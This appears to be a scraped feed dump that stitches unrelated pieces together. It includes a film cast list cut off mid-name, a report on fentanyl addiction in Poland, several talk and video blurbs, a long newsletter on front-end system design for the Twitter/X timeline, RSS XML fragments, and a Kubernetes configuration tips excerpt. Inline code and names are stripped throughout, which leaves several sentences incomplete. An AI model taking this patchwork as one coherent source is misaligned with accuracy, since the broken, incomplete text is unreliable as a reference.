The film, narrated by Peter Coyote, includes the first-person voices of nearly 200 individual historic figures, read by a cast of actors, including Adam Arkin, Jeremiah Bitsui, Corbin Bleu, Kenneth Branagh, Josh Brolin, Bill Camp, Tantoo Cardinal, Josh Charles, Hugh Dancy, Claire Danes, Jeff Daniels, Keith David, Hope Davis, Marcus Davis-Orrom, Bruce Davison, Leon Dische Becker, Alden Ehrenreich, Craig Ferguson, Morgan Freeman, Christian Friedel, Paul Giamatti, Domhnall Gleeson, Amanda Gorman, Michael Greyeyes, Jonathan Groff, Charlotte Hacke, Tom Hanks, Ethan Hawke, Maya Hawke, Lucas Hedges, Josh Hutcherson, Samuel L.

The number of people in Poland abusing this powerful painkiller is growing. There have been dozens of fatalities.

Michal lives in a small town south of Gdansk. Because of the stigma surrounding people with addiction, he prefers to remain anonymous. Every two weeks, he travels to Święciec to take methadone, a substitute drug, at the addiction clinic of the psychiatric hospital. After using various drugs, he started taking fentanyl, the strongest of all opiates. 
Fentanyl is used to treat people with severe pain and as an anesthetic. Addicts remove the gel from pain patches and inject it directly into their bloodstream. There have been dozens of fatal overdoses in Poland. Michal has also lost one of his close friends. Corrupt pharmacists are believed to have sold large quantities of fentanyl patches to dealers. The authorities have since put a stop to this.  
In Żuromin, Jadwiga Karpinska lost her son Pawel to a fatal overdose. Their town, a two-hour drive from the capital Warsaw, was known as the country’s unofficial fentanyl capital in 2024. That changed when police detained a well-known local dealer. The drug continues to be available there, but in smaller quantities.
Elementary school teacher Adam Ejnik believes in prevention. He wants to keep his students away from the drug by raising awareness about its dangers. 
Artur from Łódź has managed to get off fentanyl. A few years ago, he was so addicted, he had lost the will to live. Today, his girlfriend Agnieszka helps him stay clean. His goal: he hopes to finish his psychology degree and work as a therapist to help other addicts get off the extremely powerful drug.

In every enterprise, value emerges from connections: customers to products, suppliers to shipments, molecules to targets. This talk introduces Relational Foundation Models (RFMs)—a new class of models that reason over interactions, not just data points. Drawing on advances in graph neural networks and large-scale ML systems, I’ll show how RFMs capture structure, enable richer reasoning, and deliver measurable business impact. Audience will learn where relational modeling drives the biggest wins, how to build the data backbone for it, and how to operationalize these models responsibly and at scale.Jure Leskovec is the co-founder of Kumo.AI, an enterprise AI company pioneering AI foundation models that can reason over structured business data. He is also a Professor of Computer Science at Stanford University and a leading researcher in artificial intelligence, best known for pioneering Graph Neural Networks and creating PyG, the most widely used graph learning toolkit. Previously, Jure served as Chief Scientist at Pinterest and as an investigator at the Chan Zuckerberg BioHub.

--

The kola nut is the seed of the kola tree, a small evergreen native to the forests of West Africa, where it’s long been integral to the cultural fabric of many communities. So, how did this sacred ingredient end up all around the world? And how did it make its way into the original recipe of a drink that billions of people consume every day? Shantel George explores the bitter history of kola nuts.

Front-end system design interviews are a relatively new but increasingly important part of the hiring process for front-end engineers. They test not only one’s technical ability to build user interfaces but also the architectural thinking required to scale those interfaces to millions of users.For companies with complex, dynamic interfaces such as Twitter/X, Netflix, Airbnb, Google Docs, and Figma, the frontend client is no longer a thin layer that merely renders data. It is a distributed system in its own right, managing state, orchestrating data fetching, caching results, handling concurrency, and maintaining real-time synchronization with the backend.Designing this layer effectively can have a dramatic impact on user engagement and perceived performance, ultimately driving business goals.Front-end system design is therefore not merely about choosing frameworks or UI libraries. It is about building systems that can evolve, scale, and deliver consistent performance as features grow and teams expand. Understanding this distinction is essential before diving into the architecture of complex interfaces like the Twitter/X timeline, where milliseconds of latency and subtle interaction patterns can define the entire product experience.Your AI tools are only as good as the context they have.  pieces together knowledge from your team’s GitHub, Slack, Confluence, and Jira, so your AI tools generate production-ready code.Yangshun is the creator of , a platform for frontend engineers to prepare for front-end interviews.Check out his website and social media:He was previously a Staff Engineer at Meta. Also, he created Docusaurus 2, Blind 75, and the Tech Interview Handbook.P.S. , their biggest sale of the year. Don’t miss out on this opportunity!Types of questions in front-end system design interviewsFront-end system design interviews fall into two categories: “application design and component design.”While both draw on the same foundation of architectural thinking, they operate at different levels of abstraction and test different problem-solving instincts.The  focuses on how to structure and architect an entire product or large feature. Candidates might be asked to design something like the Twitter timeline, a media streaming website, or a collaborative document editor.These questions assess a candidate’s ability to design systems that can handle complex data flows, synchronize with back-end services, manage client-side state, and maintain consistent performance as the application scales.Strong answers demonstrate an understanding of how to divide an application into layers, manage global versus local state, handle rendering efficiently, and make trade-offs between client-side and server-side responsibilities.Each kind of app brings unique challenges that candidates should spend most of their time discussing:Social media (e.g., Facebook, Twitter): Timeline API, pagination, rendering posts in various formats, performanceE-commerce & travel booking (e.g., Amazon, Airbnb): SEO, performance, forms, localizationMedia streaming (e.g., Netflix, YouTube): Media streaming protocols, media player implementationsCollaborative apps (e.g., Google Docs, Google Sheets): Real-time collaboration models, conflict resolution approachesThe  narrows the focus to building a single, self-contained piece of UI that appears simple on the surface but hides significant complexity beneath. Common examples include designing an autocomplete input, image carousels, or a modal dialog.These components must handle accessibility, keyboard navigation, focus management, animations, and edge cases such as async data fetching and nested interactions.Interviewers use these problems to evaluate a candidate’s depth of understanding in UI behavior, browser APIs, rendering models, and user experience details.Although these two categories differ in scope, they complement each other…Application-level design tests a candidate’s ability to think in systems and to understand how data and state flow through a complex interface.Component-level design tests a candidate’s ability to execute on the smallest building blocks of those systems with precision and craft.Together, they form a complete picture of what it means to design and engineer modern front-end applications at scale.Framework for approaching front-end system design interviewsMany engineers struggle with system design interviews because they approach problems reactively, jumping straight into technical details before establishing a clear structure, or simply just hopping around topics with no clear flow, and risk ending up not sufficiently covering the important areas of the question.I know it all too well because that was how I failed my first few system design interviews.Therefore, I came up with an easy-to-remember mnemonic,  to help me remember how to approach system design questions.The  offers a systematic way to think through design questions methodically. It ensures you start with clarity, communicate your reasoning, and cover both breadth and depth.Begin by clarifying what problem you are solving and what success looks like.Identify both functional and non-functional requirements, what the system must do, and how well it must perform. This is also where you scope the problem to fit the interview.For example, when asked to design the Twitter timeline, you might clarify whether the focus is on rendering the feed, handling infinite scroll, or supporting real-time updates.Once the goals are clear, outline the high-level structure of the system and describe its responsibilities.In front-end design interviews, it’s common to have the layers for data fetching, state management, and the view (what users see and interact with). You should explain how data flows through these layers, where caching happens, and how user actions propagate changes.The goal is to show that you can decompose a complex UI into well-defined subsystems that interact cohesively.Describe the main data entities and state in the system.With Twitter, that would be the feed, tweets, composer message, etc., and how they relate to one another. A solid understanding of data modeling shows you can design efficient structures for rendering what the user needs to see and interact with.Define how different parts of the system communicate.This includes both internal interfaces, such as component boundaries and state management APIs, and external interfaces, such as REST or GraphQL endpoints. Each API should consist of the intention, parameters, and response shape.After establishing a functional design, discuss the aspects of the system that are unique or complex and how you would improve it for scale and performance.This can include performance techniques like DOM virtualization, lazy loading, media optimizations, and more.Use the  as a guide to ensure a comprehensive answer… not strict linear steps.Lead the discussion with requirements, then be flexible to dive wherever the conversation or technical complexity requires.Architecture, Data model, and the Interface (API) are usually discussed as a whole and not strictly in order.Some candidates prefer to design the data model first before the Architecture and API, which might make more sense depending on the question.Lastly, end with optimizations and deep dives, but revisit any of the earlier areas if you’re discussing new requirements or extending to new features.Design Twitter/X Timeline’s frontendLet’s apply the RADIO framework to a common front-end system design question:“Design Twitter/X Timeline.”By the end of this newsletter, we will have a solid front-end design for implementing a Twitter timeline, including specific optimizations for each part.From here on, we’ll refer to the product as “Twitter” rather than “X”, since “Twitter” is more readable and recognizable.Let’s define some core functional requirements of the Twitter timeline:Users can browse a timeline UI containing a list of tweetsTimeline contains text and image-based tweetsUsers can perform actions on tweets, such as liking and retweetingUsers can click on a tweet to view the repliesWhen users scroll to the bottom of the timeline, more tweets loadUsers can create new tweetsIn reality, Twitter’s timeline supports more formats, such as videos, polls, and other actions, like replying to tweets.But let’s first focus on the core functionality: consuming timeline tweets and creating new tweets.Besides functional requirements, we can also discuss how to improve non-functional aspects such as performance, user experience, and accessibility through optimizations and deep dives.A well-structured front-end architecture separates concerns across distinct layers, each responsible for a specific set of tasks.Before we discuss the layers involved, we have two decisions to make:(1) where to render the webpage (client vs. server vs. hybrid),(2) how navigations occur (the traditional way of full-page reloads vs. client-side).A large-scale application like Twitter can be built using several rendering approaches, each offering different trade-offs among performance, complexity, and infrastructure costs.server-side rendering (SSR),client-side rendering (CSR),Server-side rendering (SSR)SSR generates the full HTML for a page on the server before sending it to the client.This leads to faster first-paint times and better SEO because users and crawlers receive meaningful content immediately. Once the HTML is loaded, the client “hydrates” the page to attach event listeners and to enable interactivity.Modern websites rely heavily on SSR to ensure quick perceived performance.Client-side rendering (CSR)In this model, the server first delivers a minimal HTML shell and a JavaScript bundle.The browser then executes the JavaScript to fetch data and render the UI. CSR offers great interactivity once loaded, since subsequent updates can happen entirely on the client without page reloads.However, it has slower first load performance and weaker SEO, since users initially see a blank page/spinner until the data is fetched.Hybrid architectures combine SSR and CSR to get the best of both worlds.The server renders the initial page load for speed and SEO, and the client handles dynamic updates. This is often implemented using frameworks like Next.js and Remix. Twitter could render the first batch of tweets server-side and then fetch and render new tweets client-side as the user scrolls.Since timelines are highly personalized, rendering timelines on the server primarily benefits performance instead of SEO. In reality, Twitter likely uses CSR because SSR requires more infrastructure resources, and fetching a timeline on Twitter is already pretty quick (takes less than 1s); the benefits SSR brings don’t outweigh the complexity required.In practice, frameworks like Next.js, React Router, and Tanstack Start help you implement these various rendering patterns in your app, even allowing for custom rendering per page.Website navigation follows either a single-page application or a multi-page application approach… and the choice has direct implications for user experience and performance.A single-page application (SPA) is a web app that loads a single HTML page and dynamically updates its content as the user interacts with the app, without requiring a full page reload. This works by using JavaScript to modify the page URL, fetch data from the server, and update the DOM. This results in fast, seamless navigation and an app-like experience.In multi-page applications (MPA), each route corresponds to a separate HTML page. Navigating between pages triggers a full-page reload, which can simplify server-side rendering and improve SEO. Content-heavy sites typically use MPAs, but they can feel slower and less fluid for highly interactive features.For a social media app like Twitter, SPAs are preferred, and SPAs rely on CSR.More importantly, pages in SPAs can benefit from data in a shared client store. Most users access a tweet from the timeline. In an SPA, the key details of the tweet (text, media) are already loaded on the page and stored in the store; navigation to the tweet details page is instant and requires no server-side interaction. Additional data, such as replies, is fetched after navigation occurs.On the other hand, in an MPA, navigation blows away the current page state. Hence, users will experience longer delays when navigating between pages, as they have to wait for the server to finish generating the HTML.With rendering and navigation decided, we can define the layers of the Twitter front end, which can be broken down into four main layers: , , , and the .The view layer is what users interact with directly.It includes the timeline page, tweet detail page, and a tweet composer component. It’s responsible for rendering data from the store and triggering user actions, such as liking a tweet or composing a new one. Its main goal is to provide a fast, interactive, and accessible user experience while remaining declarative and predictable in how it reacts to data changes.In practice, these are your JavaScript frameworks/libraries, such as React, Vue, Svelte, etc.The store acts as the source of truth for client-side data and state.It holds all application state in memory: the timeline, tweets, users, composer message, etc. And ensures consistency across different parts of the interface.When a user performs an action, such as liking a tweet, the store immediately updates the local state (often optimistically) before synchronizing with the server. It also caches data for quick retrieval, normalizes entities to prevent duplication, and triggers re-renders in the view layer whenever data changes. The store decouples the UI from the backend, keeping the app responsive even during network delays. In an SPA, this layer is initialized once and then persisted + updated throughout the session.In practice, these are your state management libraries, such as Redux, Zustand, Jotai, etc.The data access layer abstracts away the communication with the backend APIs.It handles network requests, response parsing, and caching policies, and defines how data moves between the server and the store. This layer may also include retry logic, pagination handling, and transformations that convert raw API responses into normalized store-friendly structures. By centralizing all network operations here, the front end gains flexibility to change APIs, add batching, or introduce service workers without affecting the rest of the system.In an SPA, this layer is also initialized once and persisted throughout the session, just like the store layer.The server exposes HTTP endpoints for fetching timelines, posting tweets, and performing engagement actions such as likes or retweets.While the server defines the data model and business rules, it relies on the front end to manage presentation logic, caching, and responsiveness. This layered architecture creates a clean separation of responsibilities. The view focuses on presentation; the store manages state; the data access layer handles communication; and the server provides data.Since it’s an SPA, the store and data access layers are initialized on the first load, persisted throughout the session across navigations, and continuously updated as requests and user interactions occur.In the architecture layers diagram, several data entities are passed around.All of them either originate from the server or are being sent to the server. Hence, we can focus on the server APIs.Most of these APIs require authentication as they’re personalized or specific to the user. It’s important to note that the user’s ID shouldn’t be included in the request and shouldn't be relied on as the source of truth for identity, as it can be spoofed and create a security vulnerability. The user’s identity should be derived from session cookies sent with the request.We’ll assume the user is logged in and omit discussion of authentication and authorization mechanisms, since the focus is on the Twitter product.GET /timeline?count=10&cursor=abcReturns a list of tweets. Pagination parameters are included so that clients know how to fetch the next page of tweets.We’ll look at pagination in more detail in the optimizations section.Returns a single tweet. Depending on the desired experience, replies can be fetched using another API (e.g.,) or included in the tweet payload.This API is available to the public, but if a session cookie is included in the request, the results can include personalized fields such as whether the user has liked the tweet.Create a new tweet. It accepts the following parameters:When creating tweets with attached media, the media is first uploaded to blob storage, and an ID is returned to include in the POST request payload. Therefore, we also need an API for uploading media.This API creates a tweet for a user; hence, it requires authentication.Accepts binary data, uploads into blob storage, and returns a media object ID that can be included when creating a tweet. An alternative is for the API to provide a pre-signed URL that the client can use to upload directly to blob storage.POST /tweets/{id}/like

POST /tweets/{id}/retweetCommon actions that can be taken on tweets. There are more, but these are the two main ones.Next, let’s look at the core entities that should be modelled in a way that is both efficient for rendering and resilient to frequent updates.Similar to backend data models, which focus on efficient storage and relationships, we can model front-end data to prioritize ease of access, normalization, and caching.At the center of the timeline is the Tweet entity.Each tweet contains a rich set of information:and possibly media attachments.On the front end, data is often stored in a normalized form rather than as nested objects.This means separating the author data and media into distinct entities, each referenced by an ID. This approach makes updates more efficient. For example, when a user’s avatar or display name changes, every tweet referencing that user can automatically reflect the update without having redundant data.The User entity represents the authors and participants in the timeline.It includes metadata such as:and relationship flags (for example, whether the current user follows them).Because user data is shared across many tweets and UI surfaces, it’s often cached at the global application level to avoid repeated network requests and duplicated state.The Timeline entity itself represents the ordered feed of tweets.It can be thought of as a list of tweet IDs, annotated with pagination information for fetching older or newer tweets.Timelines are dynamic; as the user scrolls down, older tweets are fetched and appended to the list, and newer tweets can also be added to the top when the timeline is stale.Normalized store structureThese entities live in the client store following a normalized structure.Data normalization within client-side stores is the process of structuring data so that each unique entity is stored exactly once, with relationships between entities represented by references rather than nested copies. This concept mirrors relational database design, but applied in the context of a browser application.On Twitter, a tweet might include a nested user object for its author, another for a retweet, and yet another for a reply. If these user objects were duplicated across many tweets, updating a single piece of user information (e.g., a display name or avatar) would require updating every instance across the store.Normalization prevents this by separating users, tweets, and other entities into their own collections, using their IDs as keys. Entities then store references to other entities via IDs rather than embedding full user data.This structure makes updates and caching far more efficient. If a user’s profile changes, only the corresponding user entry needs to be updated, and every component referencing that user will automatically reflect the change.Normalized data also simplifies pagination, deduplication, and cache merging when new results arrive from the server. Most importantly, it keeps the client-side store lean and organized as the app grows in complexity, ensuring data consistency across views and interactions.Data fetched from the server doesn’t need to be in the finalized, normalized form.Normalization can be done on the server or the client, depending on where the processing should occur. If a product serves markets where user devices aren’t powerful… it might be better, performance-wise, to have the server handle normalization.As of 2025, Twitter normalizes timeline data on the server and sends a compact payload to clients.Optimizations and deep diveWith the core pieces of the Twitter front-end system laid out, let’s look at how the app can be optimized:We’ll look at general optimizations across the board and zoom in on specific optimizations for each part of the app. are the first touchpoint in this process.When users open the app or navigate between views, the UI should always provide a clear signal that content is being retrieved, with spinners.Twitter uses a single loading spinner, but a better approach would be to use skeleton placeholders—gray blocks resembling tweet shapes, rather than traditional spinners.Skeleton screens preserve layout stability and make loading feel shorter because the visual structure is already in place. As data arrives, the placeholders seamlessly transition into actual content. requires a similarly thoughtful approach.When something goes wrong, the interface must communicate the issue clearly without breaking immersion. For transient failures, such as a dropped network connection, the timeline can display an inline error bar or toast notification, something non-blocking that encourages the user to retry.More severe cases, such as an empty feed because of an API failure, call for a fallback UI that explains what happened and provides recovery options.Twitter shows a “Retry” button alongside a short message instead of a blank page, maintaining context while guiding the user back to normalcy.Performance optimizationsPerformance is one of the most critical dimensions of front-end system design, especially for an application as dynamic and content-heavy as the Twitter timeline.Let’s look at some performance techniques:Reducing initial page load size through code splittingCode splitting is a key performance optimization technique that allows web applications to load only the JavaScript necessary for the current view, rather than delivering the entire bundle upfront.Twitter’s features, such as timelines, profiles, and notifications, each have distinct dependencies; sending all the code at once would significantly delay the initial load.By splitting the code into smaller, route- or feature-specific chunks, the app reduces its initial JavaScript bundle size, improving time-to-first-render and time-to-interactive.In Twitter, code splitting is used in the following scenarios:: Lazily loading only the JavaScript code for the tweet formats shown in the timeline. There are many types of tweets: text, image, video, ads, etc., and each has a different appearance and interactions. Only the code needed for the tweet formats in the timeline is downloaded.: Lazily loading JavaScript code for components that are only shown upon user interaction, e.g., Emojipicker when clicking on the emoji button in the composer, auto-completion of hashtags, and profile card that only appears when hovering over a tag/mention.: Other pages, such as the tweet detail page, can be loaded lazily when a user clicks a tweet, rather than bundled with the timeline code.This improves performance for the average user, who might never visit certain routes or perform certain actions. Combined with pre-fetching (loading likely future chunks in the background), code splitting provides a balance between speed and flexibility.Modern build tools like Webpack, Rollup, and Vite support dynamic imports, which make code splitting straightforward.Optimizing rendering performance through list virtualizationThe timeline consists of a long list of tweet components, each with rich media and nested interactions.Rendering every tweet at once would overwhelm the DOM, so Twitter relies on  that render only the visible items in the viewport, using invisible s so that the scrollbars are still present without actual content.As users scroll, off-screen elements are recycled or unmounted to minimize memory usage. This approach keeps frame rates high and prevents layout thrashing.Improving perceived performance through optimistic updatesOptimistic updates work by immediately reflecting a user’s action in the interface before the server confirms the change, creating the illusion of zero latency.For actions such as liking, retweeting, or following, this technique ensures that the interface reacts instantly, maintaining the sense of momentum that defines a smooth social media experience.When a user likes a tweet, for example, the heart icon fills in and the like count increments right away. Behind the scenes, the client simultaneously sends a request to the server to record the action. If the server responds successfully, nothing more needs to happen, since the UI has already been updated. But if the request fails, the client rolls back to the previous state. This approach hides network latency from the user, making interactions feel immediate even on slow or unreliable connections.From an engineering perspective, implementing optimistic updates requires careful state management.The client must maintain a consistent local representation of the data and reconcile it with the server’s eventual response. Using a client store, this is made easier as data is shared across many views (e.g., the same tweet appearing on multiple pages/placements), the store tracks a tweet’s state in a normalized fashion and has to update a Tweet’s  value by  and  to ; there are no duplicated instances of tweets to search through and update.Efficient media renderingEvery tweet can contain images, GIFs, or videos, and these assets are often the largest contributors to load time and memory usage.Hence, it’s important to optimize how media is loaded, displayed, and recycled to maintain both perceived performance and smooth scrolling.The first principle is .Media should never be fetched or decoded until it’s near the user’s viewport. This minimizes initial bandwidth consumption and prevents layout shifts during scrolling. Modern browsers support the  attribute for images, but more advanced control can be achieved by using the  API, which allows the app to load assets slightly before they appear on screen.For videos and GIFs, loading low-resolution thumbnails or poster frames first gives the illusion of instant availability while deferring full playback until user interaction.Next comes media optimization and sizing.Twitter’s front-end requests media in multiple resolutions and serves the appropriate variant based on device type, screen density, and layout size. This is typically achieved using the  and  elements or equivalent client-side logic. On high-density displays, high-resolution assets are used selectively to maintain visual sharpness without overfetching.For videos, adaptive bitrate streaming ensures smooth playback even under varying network conditions, seamlessly switching between quality levels.Finally,  plays a significant role.Progressive image decoding and blurred low-resolution placeholders (often called LQIP or “blurhash”) give users an instant visual cue that content is loading, reducing the sense of delay. Combined with skeleton loaders and smooth transitions, the feed feels continuously alive, even when data and media are still being fetched.Timeline pagination approachesTwo common approaches to pagination in modern web applications are:Both are mechanisms for fetching data in chunks, but they differ in how they identify the next set of results and how well they handle dynamic, real-time data.It relies on numerical offsets to determine which results to fetch next.For example, a request might specify  to get the next ten tweets after the first twenty.Offset-based pagination is straightforward and easy to implement, but it becomes inefficient and unreliable as the dataset grows or changes frequently. When new tweets are inserted into the feed, offsets can shift, leading to duplicate or missing items. It also performs poorly for large offsets, as databases must skip an increasing number of records to reach the desired position.Cursor-based pagination, on the other hand, uses a unique identifier (often a tweet ID or timestamp) as a cursor to mark the boundary between pages.Instead of asking for the “next 10 results after offset 20,” the client requests “the next 10 results after tweet ID X.”Cursor-based pagination is more stable and efficient because it doesn’t depend on the dataset’s size or ordering at query time. It works well in environments where data is frequently updated, such as Twitter’s timeline, where new tweets appear constantly and older tweets can be deleted or re-ranked.For Twitter, cursor-based pagination is the rational choice.It aligns naturally with the timeline's chronological nature, avoids inconsistencies caused by real-time updates, and scales efficiently across millions of records. It also enables bidirectional navigation, allowing users to load newer tweets and scroll down (to fetch older ones) without re-fetching or skipping content.By combining cursor-based pagination with techniques such as infinite scrolling and background prefetching, Twitter can maintain a seamless, continuous feed experience that feels instantaneous, even as large volumes of data are loaded behind the scenes.Tweet formatting/rich textTweets on the timeline are more than just plain text; there are often mentions, links, hashtags, etc., within the block of text.Hence, the tweet content must be stored in a format that also captures this information, and such a format is known as .Let’s use an example tweet.“Check out @greatfrontend’s website at https://www.greatfrontend.com #webdev”… and see how we can store it as a formatted string using various approaches:This approach involves saving the text as an HTML string.The tweet renderer can parse this string with something like the  API. It then walks the parsed tree and maps each custom tag to a corresponding UI component.Markup is intuitive and familiar. Most engineers can read and understand it quickly. It mirrors how the browser already interprets hierarchical text, and it’s easy to copy or render in environments that are already HTML aware.However, because this is a string-based format, it is prone to malformed markup or escaping issues. It can also make transformations, editing, or range updates more difficult because operations require string manipulation rather than structured edits.Sanitization and security also require careful handling if the content is not fully trusted.This approach involves saving the text as a tree-like object, where each object can have children, which are an array of objects.The renderer recursively walks the tree and chooses how to present each node. This is conceptually similar to rendering parsed HTML, but the format is tailored to the app’s specific rich text model.This structure is easy to traverse, transform, and validate. Editing becomes predictable because each piece of text or formatting exists as its own object. It also avoids string parsing and maps cleanly to a React component hierarchy.However, the representation is verbose. Serializing or storing trees often takes more space than storing plain text with annotations. It can also be more complex to generate and maintain, especially if the text supports many nested or overlapping styles.This approach provides a plaintext version of the tweet, along with additional metadata indicating which portions of the text represent special elements such as URLs, hashtags, mentions, etc.The plain text remains intact, while the entity list acts as an overlay that the renderer uses to determine which spans receive special treatment.This approach is compact and efficient. It stores the text exactly once. The model is simple to delete, index, or paginate. Range-based systems also work well for basic inline styles and are a good fit for storage or API payloads.However, managing ranges becomes tricky when the text changes, as inserting or deleting characters requires updating the affected indexes. Range collisions and nested structures are harder to express. Systems that allow overlapping formatting usually require more sophisticated bookkeeping.There is no best format, and every format can work. That said, entity ranges are usually the preferred option. The payload is compact; the text is preserved verbatim, and the back end can easily generate or consume the model. The plaintext version is also useful for displaying within SEO text/description fields.Accessibility is an essential part of front-end system design, especially for an application as widely used as Twitter.The goal is to ensure that every user, regardless of ability, can effectively consume, navigate, and interact with the timeline.Semantic tags and ARIA attributesAt the foundation, semantic HTML provides the structure that assistive technologies rely on.Each tweet, button, and input element must use appropriate HTML tags and ARIA roles so that screen readers can interpret them accurately. For example, tweets can be represented as list items within a feed, and actions such as like, retweet, and reply should be actual buttons, not generic  with click handlers. This ensures that keyboard navigation and assistive software can interact with the app predictably.DOM is also sprinkled with  that are invisible to non-screen reader users but read out by screen readers:Timeline list container is labelled with aria-label=”Home timeline”Tweet actions appear as icon buttons, but they have  attributes specified on them to show the current values and the action they afford.Twitter provides several keyboard shortcuts to help users navigate the feed and perform actions on tweets. Hitting the  keys reveals the list of keyboard shortcuts.Focus management is about how users navigate the interface using a keyboard or assistive technology.A well-designed focus system lets users reach every interactive component logically, predict focus transitions, and always know their location in the interface.Native elements like , and  come with built-in focus behavior and accessibility metadata, so they should always be preferred over generic  or  elements with click handlers. For non-semantic interactive components, developers can use the tabindex attribute to make elements focusable or remove them from the tab order when hidden. Setting  allows an element to receive focus naturally, while  lets it be focused programmatically without cluttering the tab sequence.Each tweet’s DOM element has a  added to it so that every tweet can be focused. In conjunction with keyboard shortcuts, the app knows which tweet to perform actions on when the relevant keys are pressed.Twitter also adds skip links near the start of the document order and points to the timeline. It’s typically visually hidden by default and becomes visible when focused. This ensures that screen reader and keyboard users can reach it immediately without having to tab through other navigation items that appear earlier in the DOM. In contrast, sighted users don’t see an out-of-place button.<button aria-label=”Skip to home timeline” role=”button”></button>Lastly, consistent visual indicators such as outlines, shadows, or subtle color changes help users identify which element currently has focus. These cues must be clearly visible against all background themes and respect user preferences for reduced motion.Designing the Twitter timeline is a complex front-end system design challenge that brings together concepts from rendering architecture, data management, performance optimization, and user experience.Each layer of the system must balance responsiveness, performance, and accessibility to deliver a fast, intuitive interface that feels effortless despite the complexity.👋 I’d like to thank  for writing this newsletter!Plus, don’t forget to check out his site and social media:, their biggest sale of the year.

Trees are among the most extreme and successful forms of life on Earth. They build their bodies from thin air, move water with pressures that would crush a human, and grow using a fascinating system of living cables wrapped in layers of corpses. Under their bark lies a razor-thin strip of living cells, working endlessly to move water hundreds of meters, build indestructible wood, and coordinate millions of functions. 
How do trees work, and what are they even made of? What makes these ancient giants so resilient, and maybe even immortal?

Many women feel unsafe in public spaces, whether on streets, at train stations, or in parks. The danger they face overwhelmingly comes from men: Around 95% of sexualized violence in public spaces is committed by them. 

Yanni Gentsch's encounter with a stranger who secretly filmed her while she jogged in a forest in Cologne went viral on the internet after she recorded the confrontation. Her experience demonstrates a common and recurring problem.

DESCRIPTION
Andrew Harmel-Law discusses their book "Facilitating Software Architecture" and how traditional architecture approaches often become bottlenecks that slow down high-performing development teams.

Rather than architects making top-down decisions in isolation, they advocate for a facilitation approach centered on the "advice process".

This collaborative method shifts the architect's role from decision-maker to conversation facilitator. The approach has proven successful even in traditional corporate environments, ultimately creating more maintainable code bases where development teams actually enjoy working and can respond effectively to changing requirements.

More about BRING THEM HOME
A hundred and fifty years ago, the Blackfoot people witnessed the near-extinction of bison, one of the most important links to their identity, culture and spirituality – an act that nearly destroyed the tribe. Since then, the Blackfoot have endured a century long campaign of oppression and persecution from the United States government – a brutal and violent experience that they are only now healing from.

Bring Them Home follows a small group of Blackfoot who are working to right these historic wrongs by returning wild bison to their lands – an act that would heal people, re-enliven traditional culture and bring economic opportunity to their community.

But this mission has been thwarted at every turn by cattle ranchers, internal politics and the legacy of colonialism. If this opposition is successful, not only would bison never return to the wild, but it would threaten decades of work to reintroduce traditional tribal culture, language, livelihood – in essence it would complete a process started two centuries ago, a death of their spirit.]]></content:encoded></item><item><title>Confidential Observability on Kubernetes: Protecting Telemetry End-to-End - Jitendra Singh, IBM</title><link>https://www.youtube.com/watch?v=aEuWgYoMS98</link><author>CNCF [Cloud Native Computing Foundation]</author><category>dev</category><category>k8s</category><enclosure url="https://www.youtube.com/v/aEuWgYoMS98?version=3" length="" type=""/><pubDate>Tue, 25 Nov 2025 02:21:13 +0000</pubDate><source url="https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA">Dev - CNCF</source><content:encoded><![CDATA[Don't miss out!

Confidential Observability on Kubernetes: Protecting Telemetry End-to-End - Jitendra Singh, IBM India Pvt. Ltd.

Kubernetes observability tools, like Fluent Bit, OpenTelemetry, and Loki, provide deep visibility, but they also handle sensitive data: user identifiers, tokens, and internal service metadata. Even with encryption at rest and in transit, telemetry data is often exposed during collection and processing.

In this lightning talk, we’ll show how to secure observability pipelines on Kubernetes using confidential computing-enabled nodes. We demonstrate how observability components (e.g., Fluent Bit, OpenTelemetry Collector, Loki) can run inside hardware-isolated Kubernetes nodes, ensuring that telemetry data is encrypted at the source and only processed by trusted, attested workloads.

Attendees will learn a practical, zero-intrusion design that combines Kubernetes-native observability tools with confidential compute infrastructure to deliver end-to-end encrypted, trusted observability, ideal for regulated workloads in finance, healthcare, and government.]]></content:encoded></item><item><title>Lego Bricks for Developers: Turning Insights Into Golden Paths at Neo4j- Jeremy Adams &amp; Luke Beamish</title><link>https://www.youtube.com/watch?v=IdLXeK8motg</link><author>CNCF [Cloud Native Computing Foundation]</author><category>dev</category><category>k8s</category><enclosure url="https://www.youtube.com/v/IdLXeK8motg?version=3" length="" type=""/><pubDate>Tue, 25 Nov 2025 02:19:42 +0000</pubDate><source url="https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA">Dev - CNCF</source><content:encoded><![CDATA[Don't miss out!

Lego Bricks for Developers: Turning Insights Into Golden Paths at Neo4j - Jeremy Adams & Luke Beamish, Neo4j

In this talk we are going to discuss how we use engineers' feedback to build a system of reusable “Lego Bricks” at Neo4j. These Lego bricks are composable, team-owned instructions for accomplishing common developer tasks like implementing tracing, metrics, feature flags, or even constructing Argo Workflows.

Inspired by Spotify’s concept of Golden Paths, we combine Backstage Analytics (surfaced by Spotify's Insights plugin), and feedback to guide developers toward proven patterns.

In this talk, we’ll walk through how we use this data and how teams can create their very own Lego Bricks and Sets, and how this model helps us standardise, scale, and simplify the developer journey across our organisation.

Expect practical takeaways for building your own version of Golden Paths with measurable impact.]]></content:encoded></item><item><title>Phoronix Premium Cyber Week &quot;Black Friday&quot; Deal To Help Enable Linux Hardware Reviews</title><link>https://www.phoronix.com/news/Phoronix-Cyber-Week-2025</link><author>Michael Larabel</author><category>tech</category><pubDate>Tue, 25 Nov 2025 02:00:00 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[The end of 2025 is quickly approaching and while there are the various end of year holidays, you can still expect to find new and original content on Phoronix each and every single day of the year just as it's been for more than a decade of the now 21-year-old Phoronix.com.

Configuration is at the heart of every Kubernetes workload.
A missing quote, a wrong API version or a misplaced YAML indent can ruin your entire deploy.This blog brings together tried-and-tested configuration best practices. The small habits that make your Kubernetes setup clean, consistent and easier to manage.
Whether you are just starting out or already deploying apps daily, these are the little things that keep your cluster stable and your future self sane.This blog is inspired by the original Configuration Best Practices page, which has evolved through contributions from many members of the Kubernetes community.General configuration practicesUse the latest stable API versionKubernetes evolves fast. Older APIs eventually get deprecated and stop working. So, whenever you are defining resources, make sure you are using the latest stable API version.
You can always check withThis simple step saves you from future compatibility issues.Store configuration in version controlNever apply manifest files directly from your desktop. Always keep them in a version control system like Git, it's your safety net.
